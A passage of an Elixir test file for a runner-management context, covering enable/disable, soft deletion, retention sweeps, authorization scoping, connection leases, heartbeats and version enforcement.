      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "re-enables a disabled runner (clears disabled_at)", %{
      account: account,
      subject: subject
    } do
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, disabled} = Runners.disable_runner(runner, subject)
      assert disabled.disabled_at

      assert {:ok, enabled} = Runners.enable_runner(disabled, subject)
      assert is_nil(enabled.disabled_at)
    end

    test "a viewer can't enable a runner", %{account: account, subject: owner} do
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, disabled} = Runners.disable_runner(runner, owner)

      assert {:error, :unauthorized} =
               Runners.enable_runner(disabled, viewer_subject_for(account))
    end

    test "won't enable a runner from another account", %{account: account_a, subject: owner_a} do
      {_account_b, _ub, owner_b} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account_a.id, connected?: false)
      {:ok, disabled} = Runners.disable_runner(runner, owner_a)

      assert {:error, :not_found} = Runners.enable_runner(disabled, owner_b)
    end

    test "refuses to enable past the plan limit (free = 3)", %{account: account, subject: subject} do
      to_disable = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, disabled} = Runners.disable_runner(to_disable, subject)

      # Fill all three active slots while it's disabled, then try to claim a
      # fourth by re-enabling.
      for _ <- 1..3, do: Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert {:error, :over_limit, "free", 3} = Runners.enable_runner(disabled, subject)
    end
  end

  describe "delete_runner/2" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "soft-deletes (sets deleted_at) and broadcasts :runner_socket_revoked", %{
      account: account,
      subject: subject
    } do
      runner = Fixtures.Runners.create_runner(account_id: account.id)
      Runners.subscribe_runner_transport(runner)

      assert {:ok, %Runner{deleted_at: %DateTime{}}} = Runners.delete_runner(runner, subject)
      assert_receive :runner_socket_revoked
      # Gone from the default scope; history (peek uses not_deleted) returns nil.
      assert is_nil(Runners.peek_runner_by_id(runner.id))
    end

    test "a viewer (no manage_runners) is refused", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)

      assert {:error, :unauthorized} = Runners.delete_runner(runner, viewer_subject_for(account))
    end

    test "won't touch a runner in another account (cross-account → :not_found)" do
      {account_a, _ua, _owner_a} = account_with_owner_subject()
      {_account_b, _ub, owner_b} = account_with_owner_subject()
      runner_a = Fixtures.Runners.create_runner(account_id: account_a.id)

      assert {:error, :not_found} = Runners.delete_runner(runner_a, owner_b)
    end
  end

  # A never-touched-since runner: created offline, then durably disconnected
  # `hours_ago` hours back — the exact shape the inactivity sweep targets. `attrs`
  # (e.g. `group:`) let a scope test place the runner inside/outside an ACL.
  defp offline_runner(account, hours_ago, attrs \\ []) do
    runner =
      Fixtures.Runners.create_runner([account_id: account.id, connected?: false] ++ attrs)

    at = DateTime.add(DateTime.utc_now(), -hours_ago * 3_600, :second)
    Fixtures.Runners.mark_disconnected_at(runner, at)
  end

  defp retention_markers(account_id) do
    Audit.Event.Query.all()
    |> Audit.Event.Query.by_account_id(account_id)
    |> Audit.Event.Query.by_event_type("runner.retention_swept")
    |> Repo.all()
  end

  describe "change_inactive_retention_settings/1" do
    test "no attrs means automatic cleanup is off" do
      changeset = Runners.change_inactive_retention_settings()

      assert changeset.valid?
      assert changeset.changes == %{}
      assert {:ok, input} = Ecto.Changeset.apply_action(changeset, :insert)
      assert input.hours == nil
    end

    test "casts the rail form's string window" do
      changeset = Runners.change_inactive_retention_settings(%{"hours" => "720"})

      assert changeset.valid?
      assert changeset.changes == %{hours: 720}
    end

    test "a blank window turns cleanup off" do
      changeset = Runners.change_inactive_retention_settings(%{"hours" => ""})

      assert changeset.valid?
      assert changeset.changes == %{}
    end

    test "a malformed window is a field error" do
      changeset = Runners.change_inactive_retention_settings(%{"hours" => "soon"})

      refute changeset.valid?
      assert "is invalid" in errors_on(changeset).hours
    end

    test "a zero window is a field error" do
      changeset = Runners.change_inactive_retention_settings(%{"hours" => "0"})

      refute changeset.valid?
      assert "must be greater than 0" in errors_on(changeset).hours
    end

    test "a negative window is a field error" do
      changeset = Runners.change_inactive_retention_settings(hours: -6)

      refute changeset.valid?
      assert "must be greater than 0" in errors_on(changeset).hours
    end
  end

  describe "update_inactive_retention_settings/3" do
    setup do
      {account, user, subject} = account_with_owner_subject()
      %{account: account, user: user, subject: subject}
    end

    test "an owner turns cleanup on with the raw form window", %{
      account: account,
      user: user,
      subject: subject
    } do
      attrs = %{"hours" => "720"}

      assert {:ok, updated} = Runners.update_inactive_retention_settings(account, attrs, subject)
      assert updated.settings.runner_inactive_retention_hours == 720
      assert {:ok, settings} = Accounts.fetch_account_settings(account.id)
      assert settings.runner_inactive_retention_hours == 720

      {:ok, events, _} = Audit.list_events(subject)
      assert [audit] = Enum.filter(events, &(&1.event_type == "account.updated"))
      assert audit.target_kind == "account"
      assert audit.target_id == account.id
      assert audit.actor_kind == "user"
      assert audit.actor_id == user.id
    end

    test "a blank window turns cleanup off", %{account: account, subject: subject} do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 720)

      assert {:ok, updated} =
               Runners.update_inactive_retention_settings(account, %{"hours" => ""}, subject)

      assert updated.settings.runner_inactive_retention_hours == nil
      assert {:ok, settings} = Accounts.fetch_account_settings(account.id)
      assert settings.runner_inactive_retention_hours == nil
    end

    test "an invalid window is a field error and writes nothing", %{
      account: account,
      subject: subject
    } do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 720)

      assert {:error, changeset} =
               Runners.update_inactive_retention_settings(account, %{"hours" => "0"}, subject)

      assert "must be greater than 0" in errors_on(changeset).hours
      assert {:ok, settings} = Accounts.fetch_account_settings(account.id)
      assert settings.runner_inactive_retention_hours == 720
      refute Enum.any?(Repo.all(Audit.Event), &(&1.event_type == "account.updated"))
    end

    test "a viewer is denied and writes nothing", %{account: account} do
      assert {:error, :unauthorized} =
               Runners.update_inactive_retention_settings(
                 account,
                 %{"hours" => "168"},
                 viewer_subject_for(account)
               )

      assert {:ok, settings} = Accounts.fetch_account_settings(account.id)
      assert settings.runner_inactive_retention_hours == nil
      refute Enum.any?(Repo.all(Audit.Event), &(&1.event_type == "account.updated"))
    end

    test "another account's owner gets :not_found and writes nothing", %{account: account} do
      {_other_account, _other_user, other_subject} = account_with_owner_subject()

      assert {:error, :not_found} =
               Runners.update_inactive_retention_settings(
                 account,
                 %{"hours" => "168"},
                 other_subject
               )

      assert {:ok, settings} = Accounts.fetch_account_settings(account.id)
      assert settings.runner_inactive_retention_hours == nil
      refute Enum.any?(Repo.all(Audit.Event), &(&1.event_type == "account.updated"))
    end

    test "a runner-scope-restricted admin cannot arm the account-wide schedule", %{
      account: account
    } do
      admin = Fixtures.Memberships.create_membership(account_id: account.id, role: "admin")
      {:ok, db_only} = RunnerAccess.restricted(["db"], [])
      Fixtures.Memberships.force_runner_access(admin, db_only)
      admin_subject = Fixtures.Subjects.membership_subject(admin)

      assert {:error, :unauthorized} =
               Runners.update_inactive_retention_settings(
                 account,
                 %{"hours" => "24"},
                 admin_subject
               )

      assert {:ok, settings} = Accounts.fetch_account_settings(account.id)
      assert settings.runner_inactive_retention_hours == nil
    end

    test "an admin with full runner access sets the schedule", %{account: account} do
      admin = Fixtures.Memberships.create_membership(account_id: account.id, role: "admin")
      admin_subject = Fixtures.Subjects.membership_subject(admin)

      assert {:ok, updated} =
               Runners.update_inactive_retention_settings(
                 account,
                 %{"hours" => "24"},
                 admin_subject
               )

      assert updated.settings.runner_inactive_retention_hours == 24
    end

    test "a stale account snapshot keeps a concurrently changed setting", %{
      account: account,
      subject: subject
    } do
      # `account` is the caller's socket snapshot; the seam re-reads the row
      # under lock, so a setting changed since then survives the write.
      Fixtures.Accounts.set_account_settings(account, %{require_mfa: true})

      assert {:ok, updated} =
               Runners.update_inactive_retention_settings(account, %{"hours" => "6"}, subject)

      assert updated.settings.require_mfa
      assert updated.settings.runner_inactive_retention_hours == 6
    end
  end

  describe "inactive_retention_hours/1" do
    test "a positive stored window is the sweep's window" do
      account = Fixtures.Accounts.create_account()
      account = Fixtures.Accounts.set_runner_inactive_retention_hours(account, 24)

      assert Runners.inactive_retention_hours(account) == {:ok, 24}
      assert Runners.inactive_retention_hours(account.settings) == {:ok, 24}
    end

    test "no stored window means cleanup is disabled" do
      account = Fixtures.Accounts.create_account()

      assert Runners.inactive_retention_hours(account) == {:error, :retention_disabled}
      assert Runners.inactive_retention_hours(account.settings) == {:error, :retention_disabled}
    end

    test "an unusable stored window means disabled, so no destructive sweep runs" do
      account = Fixtures.Accounts.create_account()
      account = Fixtures.Accounts.force_runner_inactive_retention_hours(account, 0)

      assert Runners.inactive_retention_hours(account) == {:error, :retention_disabled}
      assert Runners.inactive_retention_hours(account.settings) == {:error, :retention_disabled}
    end
  end

  describe "sweep_inactive_runners/1" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "removes runners offline past the window and audits once", %{
      account: account,
      subject: subject
    } do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 1)
      runner = offline_runner(account, 2)

      assert {:ok, 1} = Runners.sweep_inactive_runners(subject)
      assert is_nil(Runners.peek_runner_by_id(runner.id))

      assert [marker] = retention_markers(account.id)
      assert marker.actor_kind == "user"
      assert marker.payload["count"] == 1
      assert marker.payload["inactive_hours"] == 1
    end

    test "keeps runners offline within the window", %{account: account, subject: subject} do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 6)
      runner = offline_runner(account, 3)

      assert {:ok, 0} = Runners.sweep_inactive_runners(subject)
      assert Repo.reload(runner)
      assert retention_markers(account.id) == []
    end

    test "is :retention_disabled when automatic cleanup is off", %{
      account: account,
      subject: subject
    } do
      _runner = offline_runner(account, 960)

      assert {:error, :retention_disabled} = Runners.sweep_inactive_runners(subject)
    end

    test "a viewer (no manage_runners) is refused", %{account: account} do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 720)

      assert {:error, :unauthorized} =
               Runners.sweep_inactive_runners(viewer_subject_for(account))
    end

    test "only sweeps the subject's own account", %{account: account, subject: subject} do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 720)
      {other_account, _u, _s} = account_with_owner_subject()
      other = offline_runner(other_account, 960)

      assert {:ok, 0} = Runners.sweep_inactive_runners(subject)
      assert Repo.reload(other)
    end

    test "a runner-scope-restricted admin sweeps only in-scope inactive runners", %{
      account: account
    } do
      Fixtures.Accounts.set_runner_inactive_retention_hours(account, 720)
      in_scope = offline_runner(account, 960, group: "db")
      out_of_scope = offline_runner(account, 960, group: "app")

      admin = Fixtures.Memberships.create_membership(account_id: account.id, role: "admin")
      {:ok, db_only} = RunnerAccess.restricted(["db"], [])
      Fixtures.Memberships.force_runner_access(admin, db_only)
      admin_subject = Fixtures.Subjects.membership_subject(admin)

      # Composes scope_to_subject_membership just like delete_runner: the admin
      # reaches only its scoped group, so the out-of-scope host survives.
      assert {:ok, 1} = Runners.sweep_inactive_runners(admin_subject)
      assert is_nil(Runners.peek_runner_by_id(in_scope.id))
      assert Repo.reload(out_of_scope)
    end
  end

  describe "delete_inactive_runners/3" do
    setup do
      {account, _user, _subject} = account_with_owner_subject()
      %{account: account}
    end

    test "skips a currently-connected runner even with an old prior disconnect", %{
      account: account
    } do
      # Reconnected: a later last_connected_at means it is not durably
      # disconnected, so an old last_disconnected_at must not sweep it.
      runner = offline_runner(account, 960)
      {:ok, _reconnected} = Runners.connect_runner(runner)

      assert {:ok, 0} = Runners.delete_inactive_runners(account.id, 720)
      assert Repo.reload(runner)
    end

    test "skips a never-connected (pending) runner", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert {:ok, 0} = Runners.delete_inactive_runners(account.id, 720)
      assert Repo.reload(runner)
    end

    test "skips a disabled runner offline past the cutoff", %{account: account} do
      runner = account |> offline_runner(960) |> Fixtures.Runners.disable_runner()

      assert {:ok, 0} = Runners.delete_inactive_runners(account.id, 720)
      assert Repo.reload(runner)
    end

    test "returns 0 and writes no marker when nothing matches", %{account: account} do
      assert {:ok, 0} = Runners.delete_inactive_runners(account.id, 720)
      assert retention_markers(account.id) == []
    end
  end

  describe "list_connected_runners_for_account/2" do
    setup do
      {account, _user, _subject} = account_with_owner_subject()
      %{account: account}
    end

    test "lists only the account's enabled, durably-connected runners", %{account: account} do
      connected_runner = Fixtures.Runners.create_runner(account_id: account.id)
      _pending_runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      _offline_runner = offline_runner(account, 1)
      _other_account_runner = Fixtures.Runners.create_runner()

      # Disabled/deleted while their connection-record columns still read
      # connected — the connection columns alone must not qualify them.
      disabled_runner = Fixtures.Runners.create_runner(account_id: account.id)
      Fixtures.Runners.disable_runner(disabled_runner)
      deleted_runner = Fixtures.Runners.create_runner(account_id: account.id)
      Fixtures.Runners.mark_deleted(deleted_runner)

      connected_ids =
        account.id
        |> Runners.list_connected_runners_for_account()
        |> Enum.map(& &1.id)

      assert connected_ids == [connected_runner.id]
    end
  end

  describe "list_pack_referencing_runners_for_account/2" do
    setup do
      {account, _user, _subject} = account_with_owner_subject()
      %{account: account}
    end

    test "adds the deliberately parked runners the connected set excludes", %{account: account} do
      connected_runner = Fixtures.Runners.create_runner(account_id: account.id)
      _pending_runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      _offline_runner = offline_runner(account, 1)
      _other_account_runner = Fixtures.Runners.create_runner()

      disabled_runner = Fixtures.Runners.create_runner(account_id: account.id)
      Fixtures.Runners.disable_runner(disabled_runner)
      deleted_runner = Fixtures.Runners.create_runner(account_id: account.id)
      Fixtures.Runners.mark_deleted(deleted_runner)

      # Disabled IS included — pack retention must not delete a parked runner's
      # trust pins, because re-enabling cannot recover them. Merely disconnected
      # and deleted are still excluded, so those age out as before.
      ids =
        account.id
        |> Runners.list_pack_referencing_runners_for_account()
        |> Enum.map(& &1.id)
        |> Enum.sort()

      assert ids == Enum.sort([connected_runner.id, disabled_runner.id])
    end
  end

  describe "apply_state/2" do
    setup do
      account = Fixtures.Accounts.create_account()
      %{account: account}
    end

    test "a config runner.group rename propagates on the next reconnect", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id, group: "old-group")

      {:ok, updated} =
        Runners.apply_state(runner, %{
          "group" => "new-group",
          "hostname" => "h1",
          "packs" => %{}
        })

      assert updated.group == "new-group"
    end

    test "keeps the existing group when the payload's group is blank or missing", %{
      account: account
    } do
      runner = Fixtures.Runners.create_runner(account_id: account.id, group: "keep-me")

      assert {:ok, blank} = Runners.apply_state(runner, %{"group" => ""})
      assert blank.group == "keep-me"

      assert {:ok, missing} = Runners.apply_state(runner, %{"hostname" => "h2"})
      assert missing.group == "keep-me"
    end

    test "sets enforce_signatures when the runner advertises it", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)
      refute runner.enforce_signatures

      {:ok, updated} =
        Runners.apply_state(runner, %{
          "enforce_signatures" => true,
          "max_attestation_age_seconds" => 86_400
        })

      assert updated.enforce_signatures
      assert updated.max_attestation_age_seconds == 86_400
    end

    test "clears enforce_signatures when a later advertisement omits it", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id, enforce_signatures: true)
      assert runner.enforce_signatures

      # The latest advertisement is authoritative: a reconnect that doesn't
      # advertise enforcement (the toggle flipped off in config) clears it.
      {:ok, updated} = Runners.apply_state(runner, %{"hostname" => "h"})
      refute updated.enforce_signatures
    end

    test "absorbs runner-declared hostname/labels/version from the payload", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)

      {:ok, updated} =
        Runners.apply_state(runner, %{
          "hostname" => "new-host",
          "labels" => %{"env" => "prod"},
          "version" => "9.9.9"
        })

      assert updated.hostname == "new-host"
      assert updated.labels == %{"env" => "prod"}
      assert updated.runner_version == "9.9.9"
    end

    test "refuses advertisements after the runner is disabled", %{account: account} do
      user = Fixtures.Users.create_user()

      Fixtures.Memberships.create_membership(
        account_id: account.id,
        user_id: user.id,
        role: "owner"
      )

      subject = Fixtures.Subjects.subject_for(user, account, role: :owner)
      runner = Fixtures.Runners.create_runner(account_id: account.id, hostname: "before")
      {:ok, _disabled} = Runners.disable_runner(runner, subject)

      assert Runners.apply_state(runner, %{"hostname" => "after"}) == {:error, :not_found}
      assert Repo.reload!(runner).hostname == "before"
    end

    test "persists advertised degraded packs, normalized and bounded", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)

      {:ok, updated} =
        Runners.apply_state(runner, %{
          "degraded_packs" => [
            %{"pack" => "cloud-init", "reason" => "packs: parse pack.yaml: yaml: unmarshal"},
            %{"pack" => String.duplicate("p", 200), "reason" => String.duplicate("r", 2_000)},
            # Hostile/garbage shapes are dropped, never persisted.
            %{"pack" => "", "reason" => "empty pack"},
            %{"pack" => "no-reason"},
            "not-a-map",
            %{"pack" => 7, "reason" => 9}
          ]
        })

      assert [first, second] = updated.degraded_packs

      assert first == %{
               "pack" => "cloud-init",
               "reason" => "packs: parse pack.yaml: yaml: unmarshal"
             }

      assert second["pack"] == String.duplicate("p", 80)
      assert second["reason"] == String.duplicate("r", 500)
    end

    test "caps advertised degraded packs at 32 entries", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)

      entries =
        Enum.map(1..40, fn index ->
          %{"pack" => "pack#{index}", "reason" => "broken"}
        end)

      {:ok, updated} = Runners.apply_state(runner, %{"degraded_packs" => entries})
      assert length(updated.degraded_packs) == 32
    end

    test "an advertisement without degraded packs clears them", %{account: account} do
      runner = Fixtures.Runners.create_runner(account_id: account.id)

      {:ok, degraded} =
        Runners.apply_state(runner, %{
          "degraded_packs" => [%{"pack" => "busted", "reason" => "broken"}]
        })

      assert [%{"pack" => "busted"}] = degraded.degraded_packs

      # The latest advertisement is authoritative: a repaired (or older)
      # runner that advertises no degraded packs resets the record.
      {:ok, repaired} = Runners.apply_state(degraded, %{"hostname" => "h"})
      assert repaired.degraded_packs == []
    end
  end

  describe "apply_state_from_connection/4" do
    test "rejects a state update from a superseded lease" do
      runner = Fixtures.Runners.create_runner(connected?: true)

      assert {:ok, updated} =
               Runners.apply_state_from_connection(
                 runner,
                 %{"hostname" => "owned"},
                 runner.connection_generation,
                 runner.connection_lease_id
               )

      assert updated.hostname == "owned"

      assert {:error, :not_found} =
               Runners.apply_state_from_connection(
                 runner,
                 %{"hostname" => "stale"},
                 runner.connection_generation,
                 Ecto.UUID.generate()
               )

      assert Repo.reload!(runner).hostname == "owned"
    end
  end

  describe "connect_runner/3" do
    test "tracks presence, stamps last_connected_at, and audits the claim" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      refute Runners.online?(runner.account_id, runner.id)
      context = %RequestContext{ip_address: "10.0.0.1"}

      assert {:ok, %Runner{last_connected_at: %DateTime{}}} =
               Runners.connect_runner(runner, "tok-123", context)

      assert Runners.online?(runner.account_id, runner.id)

      assert event = Repo.one(Audit.Event)
      assert event.event_type == "runner.connected"
      assert event.account_id == runner.account_id
      assert event.actor_kind == "runner"
      assert event.target_id == runner.id
      assert event.payload["token_id"] == "tok-123"
      assert event.ip_address == "10.0.0.1"
    end

    test "refuses a second live holder of the same runner identity without a false audit" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {:ok, first_claim} = Runners.connect_runner(runner)

      assert {:error, :already_connected} = Runners.connect_runner(runner)

      assert Runners.connection_owner?(
               runner.account_id,
               runner.id,
               first_claim.connection_generation,
               first_claim.connection_lease_id
             )

      # Only the first claim audited — the refused one left no row.
      assert [%Audit.Event{event_type: "runner.connected"}] = Repo.all(Audit.Event)
    end

    test "a presence-track failure releases the claim and audits the disconnect" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {:ok, first} = Runners.connect_runner(runner)
      Fixtures.Runners.expire_connection_lease(first)

      # The reclaim succeeds durably, but this process already tracks the
      # runner in presence, so Presence.track returns {:error, {:already_tracked, …}}
      # and the compensation path must release the fresh claim again.
      assert {:error, {:presence, _reason}} = Runners.connect_runner(runner)

      released = Repo.reload!(runner)
      assert released.connection_lease_id == nil
      assert released.last_disconnect_reason == "presence track failed"

      # Two honest claims, plus the compensation disconnect for the second.
      event_types = Repo.all(Audit.Event) |> Enum.map(& &1.event_type) |> Enum.sort()
      assert event_types == ["runner.connected", "runner.connected", "runner.disconnected"]
    end

    test "an expired lease can be reclaimed even while stale Presence remains" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {:ok, first} = Runners.connect_runner(runner)
      topic = Presence.topic(runner.account_id)

      Fixtures.Runners.expire_connection_lease(first)

      :ok = Presence.untrack(self(), topic, runner.id)

      stale_pid =
        spawn(fn ->
          receive do
            :stop -> :ok
          end
        end)

      {:ok, _ref} =
        Presence.track(stale_pid, topic, runner.id, %{
          connection_generation: first.connection_generation,
          connection_lease_id: first.connection_lease_id
        })

      assert Runners.online?(runner.account_id, runner.id)
      assert {:ok, second} = Runners.connect_runner(runner)
      assert second.connection_generation == first.connection_generation + 1
      assert second.connection_lease_id != first.connection_lease_id

      send(stale_pid, :stop)
    end

    test "reports an inactive runner separately from a duplicate live connection" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      Fixtures.Runners.disable_runner(runner)

      assert {:error, :not_found} = Runners.connect_runner(runner)
      assert Repo.all(Audit.Event) == []
    end

    test "refuses a stale connection after its account is disabled" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert {:ok, _account} =
               Emisar.Accounts.set_account_disabled_for_support(
                 account.id,
                 true,
                 "Temporary hold",
                 subject
               )

      assert {:error, :account_disabled} = Runners.connect_runner(runner)
      refute Enum.any?(Repo.all(Audit.Event), &(&1.event_type == "runner.connected"))
    end
  end

  describe "disconnect_runner/5" do
    test "a released lease cannot stamp or audit its successor disconnected" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {:ok, first} = Runners.connect_runner(runner)

      assert {:ok, _disconnected} =
               Runners.disconnect_runner(
                 first.id,
                 first.connection_generation,
                 first.connection_lease_id,
                 "closed"
               )

      Presence.untrack(self(), Presence.topic(runner.account_id), runner.id)
      {:ok, second} = Runners.connect_runner(runner)

      assert {:error, :not_found} =
               Runners.disconnect_runner(
                 first.id,
                 first.connection_generation,
                 first.connection_lease_id,
                 "stale"
               )

      current = Repo.reload!(runner)
      assert current.connection_lease_id == second.connection_lease_id
      assert current.last_disconnect_reason == nil

      # Only the owned close audited — the superseded attempt left no row.
      events = Repo.all(Audit.Event)

      assert [%Audit.Event{payload: %{"reason" => "closed"}}] =
               Enum.filter(events, &(&1.event_type == "runner.disconnected"))
    end

    test "stamps disconnect history, clears the lease, and audits the close reason" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {:ok, claimed} = Runners.connect_runner(runner)
      context = %RequestContext{ip_address: "10.0.0.9"}

      assert {:ok,
              %Runner{
                last_disconnected_at: %DateTime{},
                last_disconnect_reason: "shutdown",
                connection_lease_id: nil,
                connection_lease_expires_at: nil
              }} =
               Runners.disconnect_runner(
                 claimed.id,
                 claimed.connection_generation,
                 claimed.connection_lease_id,
                 "shutdown",
                 context
               )

      event = Enum.find(Repo.all(Audit.Event), &(&1.event_type == "runner.disconnected"))
      assert event.account_id == runner.account_id
      assert event.actor_kind == "runner"
      assert event.target_id == runner.id
      assert event.payload["reason"] == "shutdown"
      assert event.ip_address == "10.0.0.9"
    end

    test "returns not_found for an unknown runner and audits nothing" do
      assert {:error, :not_found} =
               Runners.disconnect_runner(Ecto.UUID.generate(), 1, Ecto.UUID.generate(), "gone")

      assert Repo.all(Audit.Event) == []
    end
  end

  describe "record_heartbeat/5" do
    test "renews the owner lease and refreshes action_load in presence" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {:ok, claimed} = Runners.connect_runner(runner)

      assert {:ok, _presence_ref} =
               Runners.record_heartbeat(
                 runner.account_id,
                 runner.id,
                 claimed.connection_generation,
                 claimed.connection_lease_id,
                 7
               )

      renewed = Repo.reload!(claimed)

      assert %{metas: [meta | _]} =
               Runners.connection_metas(runner.account_id) |> Map.fetch!(runner.id)

      assert meta.action_load == 7
      assert is_integer(meta.last_heartbeat_at)

      assert DateTime.compare(
               renewed.connection_lease_expires_at,
               claimed.connection_lease_expires_at
             ) in [:eq, :gt]
    end
  end

  describe "connection_owner?/4" do
    test "rejects a stale lease id" do
      runner = Fixtures.Runners.create_runner(connected?: true)

      assert Runners.connection_owner?(
               runner.account_id,
               runner.id,
               runner.connection_generation,
               runner.connection_lease_id
             )

      refute Runners.connection_owner?(
               runner.account_id,
               runner.id,
               runner.connection_generation,
               Ecto.UUID.generate()
             )
    end
  end

  describe "current_connection_generation/2" do
    test "returns only a live connection generation" do
      runner = Fixtures.Runners.create_runner(connected?: true)
      generation = runner.connection_generation

      assert {:ok, ^generation} =
               Runners.current_connection_generation(runner.account_id, runner.id)
    end
  end

  # test.exs Compat policy: < 0.0.1 unsupported, >= 0.1.0 supported. The
  # override lives in this test process, so the file stays async-safe.
  defp enforce_runner_versions(enforce?) do
    previous = Emisar.Config.get_env(:emisar, Emisar.Compat)

    Emisar.Config.put_override(
      :emisar,
      Emisar.Compat,
      Keyword.put(previous, :runner_enforce, enforce?)
    )
  end

  describe "enforce_runner_version/2" do
    test "enforce on: a below-minimum version is rejected with an audit row" do
      enforce_runner_versions(true)
      runner = Fixtures.Runners.create_runner(connected?: false, runner_version: "0.0.0")

      assert {:error, {:unsupported_version, ">= 0.0.1"}} =
               Runners.enforce_runner_version(runner, %RequestContext{ip_address: "10.0.0.7"})

      assert event = Repo.one(Audit.Event)
      assert event.event_type == "runner.version_rejected"
      assert event.account_id == runner.account_id
      assert event.actor_kind == "runner"
      assert event.target_id == runner.id
      assert event.payload["runner_version"] == "0.0.0"
      assert event.payload["minimum"] == ">= 0.0.1"
      assert event.ip_address == "10.0.0.7"
    end

    test "warn-only: a below-minimum version proceeds without audit" do
      runner = Fixtures.Runners.create_runner(connected?: false, runner_version: "0.0.0")

      assert :ok = Runners.enforce_runner_version(runner, %RequestContext{})
      assert Repo.all(Audit.Event) == []
    end

    test "enforce on: supported and unparseable (:unknown) versions proceed" do
      enforce_runner_versions(true)
      supported = Fixtures.Runners.create_runner(connected?: false, runner_version: "1.0.0")

      unparseable =
        Fixtures.Runners.create_runner(connected?: false, runner_version: "dev-abc123")

      assert :ok = Runners.enforce_runner_version(supported, %RequestContext{})
      assert :ok = Runners.enforce_runner_version(unparseable, %RequestContext{})
      assert Repo.all(Audit.Event) == []
    end
  end

  describe "online?/2" do
    test "true while a socket is tracked, false once untracked" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)
      assert Runners.online?(account.id, runner.id)

      :ok = Presence.untrack(self(), Presence.topic(account.id), runner.id)
      refute Runners.online?(account.id, runner.id)
    end

    test "is account-scoped — another account never sees the runner online" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account_a.id, connected?: true)

      assert Runners.online?(account_a.id, runner.id)
      refute Runners.online?(account_b.id, runner.id)
    end
  end

  describe "connection_metas/1" do
    test "returns the presence map for the account's tracked runners" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)

      assert %{metas: [_ | _]} =
               Runners.connection_metas(account.id) |> Map.fetch!(runner.id)
    end

    test "is account-scoped — an account with no presence reads as empty" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()
      _ = Fixtures.Runners.create_runner(account_id: account_a.id, connected?: true)

      assert Runners.connection_metas(account_b.id) == %{}
    end
  end

  describe "connection_state/1" do
    test "maps online / disabled / pending / offline" do
      now = DateTime.utc_now()

      assert Runners.connection_state(%Runner{online?: true}) == :online
      assert Runners.connection_state(%Runner{disabled_at: now}) == :disabled
      assert Runners.connection_state(%Runner{online?: false, last_connected_at: nil}) == :pending

      assert Runners.connection_state(%Runner{online?: false, last_connected_at: now}) ==
               :offline

      # disabled wins over a still-live socket
      assert Runners.connection_state(%Runner{online?: true, disabled_at: now}) == :disabled
    end

    # there is NO heartbeat-age `:stale` state by design.
    # Liveness is enforced only at the socket (the 90s heartbeat-timeout watcher),
    # never re-derived from `last_heartbeat_at`: an `online?` runner reads :online
    # no matter how old its last heartbeat looks. The binary stays honest because
    # the socket would already have closed a genuinely silent runner to :offline.
    test "stays :online regardless of last_heartbeat_at age (no :stale)" do
      ancient = DateTime.add(DateTime.utc_now(), -3600, :second)

      assert Runners.connection_state(%Runner{online?: true, last_heartbeat_at: ancient}) ==
               :online

      # A nil heartbeat on a live socket is still :online, not a derived stale state.
      assert Runners.connection_state(%Runner{online?: true, last_heartbeat_at: nil}) == :online
    end
  end

  describe "runner_readiness/2" do
    setup do
      %{now: ~U[2026-08-03 12:00:00.000000Z]}
    end

    test "an online runner with a recent heartbeat is fresh and portal-ready", %{now: now} do
      runner_id = Ecto.UUID.generate()

      runner = %Runner{
        id: runner_id,
        online?: true,
        action_load: 2,
        last_connected_at: DateTime.add(now, -600, :second),
        last_heartbeat_at: DateTime.add(now, -10, :second)
      }

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.runner_id == runner_id
      assert readiness.connection == %{state: :online, reason: :presence_online}
      assert readiness.heartbeat.state == :fresh
      assert readiness.heartbeat.reason == :heartbeat_recent
      assert readiness.heartbeat.at == runner.last_heartbeat_at
      assert readiness.heartbeat.connected_at == runner.last_connected_at
      assert readiness.signatures == %{mode: :unsigned_allowed, reason: :unsigned_allowed}
      assert readiness.degradation == %{state: :healthy, reason: :all_packs_loaded, packs: []}
      assert readiness.portal_dispatch == %{state: :ready, reason: :online}
